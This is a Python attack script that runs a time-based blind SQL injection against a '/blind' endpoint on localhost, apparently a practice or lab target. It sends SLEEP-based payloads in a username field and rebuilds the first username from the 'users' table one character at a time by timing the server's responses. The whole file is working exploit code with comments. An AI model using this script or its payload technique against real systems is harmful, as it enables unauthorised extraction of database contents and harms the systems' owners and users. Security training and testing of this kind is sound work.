import httpx
import time

# -----------------------------
# Configuration Section
# -----------------------------

# The URL of the vulnerable /blind endpoint
TARGET_URL = "http://localhost:5000/blind"

# The expected delay we rely on to detect true conditions
DELAY = 10

# Optional headers, can be expanded to simulate browser-like traffic
HEADERS = {
    "User-Agent": "BlindSQLi-Agent"
}

# -----------------------------
# Function: Check Character Match
# -----------------------------
def is_true_condition(payload):
    '''
    Sends a POST request with a payload and returns True if the server delays
    by DELAY seconds, indicating a true condition (like a correct character match).
    '''
    try:
        start = time.time()
        # Send payload as 'username' field to the blind endpoint
        r = httpx.post(TARGET_URL, data={"username": payload}, headers=HEADERS, timeout=DELAY + 5)
        elapsed = time.time() - start
        print(f"[+] Payload: {payload} | Response Time: {elapsed:.2f}s")
        return elapsed >= DELAY
    except httpx.ReadTimeout:
        print("[!] Timeout (interpreted as TRUE condition due to delay).")
        return True
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return False

# -----------------------------
# Function: Extract First Username
# -----------------------------
def extract_first_username():
    '''
    Brute-forces one character at a time from the first username in the 'users' table.
    Assumes the 'users' table exists and is vulnerable to time-based blind SQLi.
    '''
    username = ""
    # Loop through 1 to 20 assuming max username length is 20
    for i in range(1, 21):
        found = False
        # Check only printable ASCII chars (32 to 126)
        for c in range(32, 127):
            payload = f"' OR ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), {i}, 1)) = {c} AND SLEEP({DELAY}) -- "
            if is_true_condition(payload):
                username += chr(c)
                print(f"[+] Found character {i}: {chr(c)}")
                found = True
                break
        if not found:
            print("[*] Username extraction complete.")
            break
    return username

# -----------------------------
# Main Execution
# -----------------------------
if __name__ == "__main__":
    print("[*] Starting username extraction via Blind SQL Injection...")
    username = extract_first_username()
    print(f"[+] Extracted username: {username}")
